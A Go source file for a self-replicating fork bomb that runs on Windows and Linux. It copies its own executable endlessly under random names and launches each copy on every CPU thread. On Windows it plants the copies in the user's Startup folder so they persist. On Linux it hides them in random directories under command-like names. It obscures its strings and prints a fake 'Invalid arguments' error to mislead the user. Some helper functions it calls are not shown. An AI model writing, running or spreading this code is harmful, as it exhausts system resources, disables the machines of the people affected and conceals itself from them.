package main

import (
	"fmt"
	"io"
	"math/rand"
	"os"
	"os/exec"
	"os/user"
	"path"
	"runtime"
	"strings"
	"time"
)

var __DEBUG_str string = "true"
var DEBUG bool
var isWindows bool

// ? Assigns DEBUG based on the value of __DEBUG_str
func checkDebug() {
	fmt.Println(__DEBUG_str)
	DEBUG = __DEBUG_str == "true"
}

// ? Prints text to the console if DEBUG == true
func verbose(prefix string, log ...any) {
	if DEBUG {
		if len(prefix) > 4 {
			panic(fmt.Sprintf("Log prefix length cannot be > 4 characters: %s", prefix))
		}

		fmt.Printf("[%s]:\t%v\n", prefix, log)
	}
}

// ? Get the current processes startup folder
func getProcessFolder() string {
	path, err := os.Executable()
	if err != nil {
		fmt.Println(err)
		os.Exit(1)
	}

	return path
}

// ? Get the current username
func getUsername() string {
	user, err := user.Current()

	if err != nil {
		fmt.Println(err)
		os.Exit(1)
	}

	name_a := strings.Split(user.Username, "\\")
	name := name_a[len(name_a)-1]

	return name
}

var cmd_exe string = getStr(CMD_EXE)
var c string = getStr(_C)
var strt string = getStr(START)

// ? Start a Windows process using cmd.exe (should be used with 'go')
func startProcW(cmd string) {
	proc := exec.Command(cmd_exe, c, strt, cmd)
	err := proc.Start()
	if err != nil {
		verbose("cmd", err)
		return
	}
}

// ? Start a Linux process using bash (should be used with 'go')
func startProcL(cmd string) {
	parts := strings.Split(cmd, " ")
	cmdName := parts[0]
	args := parts[1:]

	// Create a new process with `Start()`
	err := exec.Command(cmdName, args...).Start()
	if err != nil {
		verbose("cmd", err)
		return
	}
}

// ? Copy a file to.. Somewhere else
func copy(srcFile string, dstFile string) {
	src, err := os.Open(srcFile)
	if err != nil {
		fmt.Println(err)
		return
	}

	defer src.Close()

	dst, err := os.Create(dstFile)
	if err != nil {
		fmt.Println(err)
		return
	}

	defer dst.Close()

	_, err = io.Copy(dst, src)
	if err != nil {
		fmt.Println(err)
		return
	}
}

// ? Creates a directory if it doesn't already exist
func ensureDir(directory string) {
	if _, err := os.Stat(directory); os.IsNotExist(err) {
		err = os.MkdirAll(directory, 0755)
		if err != nil {
			fmt.Println(err)
			return
		}
	}
}

// ? Starts an infinite loop, copying then running
func whileCopyW(sourceFile string, targetDir string) {
	ensureDir(targetDir)

	formatStr := getStr(NEW_NAME_FORMATTER)

	for {
		tmpName := fmt.Sprintf(formatStr, targetDir, rand.Int63())

		// Copy cannot use the 'go' keyword or the .exe won't exist
		// by the time we're calling it
		copy(sourceFile, tmpName)

		if !DEBUG {
			// Use 'go' to "fork" (process won't return)
			go startProcW(tmpName)
		}
	}
}

func whileCopyL(sourceFile string, targetDir string) {
	ensureDir(targetDir)

	for {
		f_rnd := rand.Int63()

		var tmpName string

		// 1 out of 5 times, we'll use a command name (make it harder to find files)
		if f_rnd%5 == 0 {
			tmpName = getRandFile()
		} else {
			tmpName = fmt.Sprint(f_rnd)
		}

		tmpName = path.Join(targetDir, tmpName)

		copy(sourceFile, tmpName)

		// if !DEBUG {
		go startProcL(tmpName)
		// }
	}
}

// ? Entry point
func main() {
	// Initialize DEBUG
	checkDebug()

	isWindows = runtime.GOOS == "windows"

	var this string
	var startup string

	// Get paths
	if isWindows {
		this, startup = startWindows()
	} else { // Otherwise, assume it's Linux
		this, startup = startLinux()
	}

	//os.Exit(1)

	// Get the number of threads the CPU supports
	threads := runtime.NumCPU()

	verbose("bgn", "Starting...")
	for i := 0; i < threads; i++ {
		verbose("gort", "Start ", i)

		// Start copying on a new goroutine
		if isWindows {
			go whileCopyW(this, startup)
		} else {
			go whileCopyL(this, startup)
		}
	}

	// Wait 10 milliseconds to make sure at least one instance gets started
	time.Sleep(time.Millisecond * 10)

	// if len(os.Args) != 0 && os.Args[0] == "::UNLOCK::" {
	// Prevent app exit
	for {
		time.Sleep(time.Hour)
	}
	// }

	// Fake an error
	fmt.Println("Invalid arguments:", os.Args)
}

// ? Get application data for Linux
func startLinux() (string, string) {
	// Folder pointing to this app
	this := getProcessFolder()
	verbose("this", this)

	// Current username (minus the hostname)
	user := getUsername()
	verbose("user", user)

	// Find a random folder (new folder per app instance)
	startup := getRandDir("/")
	verbose("rnd", startup)

	if DEBUG {
		// Use this to verify it works
		startup = fmt.Sprintf("/home/%s/FOKBOMB_TMP", user)
		verbose("rsgn", startup)
	}

	return this, startup
}

// ? Get application data for Windows
func startWindows() (string, string) {
	// Folder pointing to this app
	this := getProcessFolder()
	verbose("this", this)

	// Current username (minus the hostname)
	user := getUsername()
	verbose("user", user)

	// User startup folder
	startup := fmt.Sprintf(getStr(WIN_STARTUP_FOLDER_FORMATTER), user)
	verbose("strt", startup)

	if DEBUG {
		// Use this to verify it works
		startup = fmt.Sprintf(getStr(WIN_DEBUG_STARTUP_FOLDER_FORMATTER), user)
		verbose("rsgn", startup)
	}

	return this, startup
}
